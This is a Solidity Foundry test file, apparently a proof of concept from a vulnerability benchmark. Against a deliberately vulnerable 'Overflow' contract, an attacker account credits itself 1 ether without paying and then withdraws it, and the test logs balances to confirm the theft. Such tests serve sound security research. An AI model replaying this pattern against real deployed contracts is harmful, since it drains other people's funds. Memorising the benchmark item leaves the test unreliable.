// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/integer_overflow_1.sol";

contract OverflowTest is Test {
    Overflow public overflow;
    address public attacker = makeAddr("attacker");
    address public owner = makeAddr("owner");
    
    function setUp() public {
        vm.prank(owner);
        overflow = new Overflow();
        
        // Set contract balance directly using cheatcodes
        vm.deal(address(overflow), 2 ether);
    }

    function testArbitraryWithdraw() public {
        // Query initial states
        console.log("--- BEFORE-Trigger States ---");
        uint256 initialContractBalance = address(overflow).balance;
        uint256 initialAttackerBalance = attacker.balance;
        uint256 initialUserBalance = overflow.userBalances(attacker);
        uint256 initialTotalDeposits = overflow.totalDeposits();
        
        console.log("Contract ETH balance: %d", initialContractBalance);
        console.log("Attacker ETH balance: %d", initialAttackerBalance);
        console.log("Attacker contract balance: %d", initialUserBalance);
        console.log("Contract total deposits: %d", initialTotalDeposits);

        console.log("--- Trigger Attack Actions ---");
        // Attacker adds balance without transferring ETH
        vm.prank(attacker);
        overflow.add(1 ether);

        // Attacker withdraws despite not contributing ETH
        vm.prank(attacker);
        overflow.withdraw(1 ether);
        console.log("--- AFTER-Trigger States ---");

        // Query post-attack states
        uint256 afterContractBalance = address(overflow).balance;
        uint256 afterAttackerBalance = attacker.balance;
        uint256 afterUserBalance = overflow.userBalances(attacker);
        uint256 afterTotalDeposits = overflow.totalDeposits();
        
        console.log("Contract ETH balance: %d", afterContractBalance);
        console.log("Attacker ETH balance: %d", afterAttackerBalance);
        console.log("Attacker contract balance: %d", afterUserBalance);
        console.log("Contract total deposits: %d", afterTotalDeposits);

        // Verify ETH transfer and balance changes (original assertions)
        assertEq(
            afterAttackerBalance,
            initialAttackerBalance + 1 ether,
            "Attacker received ETH"
        );
        assertEq(
            afterContractBalance,
            initialContractBalance - 1 ether,
            "Contract balance reduced"
        );

        // Vulnerability verification logic
        bool contractBalanceReduced = afterContractBalance < initialContractBalance;
        bool attackerBalanceIncreased = afterAttackerBalance > initialAttackerBalance;
        bool userBalanceChanged = afterUserBalance != initialUserBalance;
        bool depositsChanged = afterTotalDeposits != initialTotalDeposits;
        
        // Final vulnerability verdict
        if (attackerBalanceIncreased && contractBalanceReduced) {
            console.log("Vulnerability Exists: Attacker successfully withdrew 1 ether without depositing");
        } else {
            console.log("Vulnerability not Exist: No unauthorized funds transfer occurred");
        }
    }
}